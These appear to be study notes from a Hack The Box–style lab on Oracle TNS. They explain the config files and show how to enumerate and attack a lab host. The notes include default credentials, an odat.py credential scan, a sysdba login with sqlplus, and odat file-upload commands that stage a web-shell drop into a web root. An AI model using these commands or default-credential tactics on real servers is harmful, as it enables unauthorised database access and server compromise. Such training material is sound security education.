## Definition
The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.

## Networking
TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks

TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:

## Port
By default, the listener listens for incoming connections on the `TCP/1521` port.

## Configurations
The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.


The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.


> [!NOTE]
> Each of the Oracle TNS version has different security implementation.
> For example, Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one. Another example would be that many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```
On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.

Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution.

#### ODAT
Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

#### Nmap

```shell-session
alakin2504@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.

The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.

#### Nmap - SID Bruteforcing

```shell-session

```

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.

```shell-session
alakin2504@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16

[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.

#### SQLplus - Log In
```shell-session
alakin2504@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

> [!NOTE] Note
If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session
alakin2504@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:

#### Oracle RDBMS - Interaction
```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
```

#### Login as another user/privilege
```shell-session
alakin2504@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0
```

## Alternative Approach
Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

#### Oracle RDBMS - File Upload


```shell-session
alakin2504@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
alakin2504@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell-session
alakin2504@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
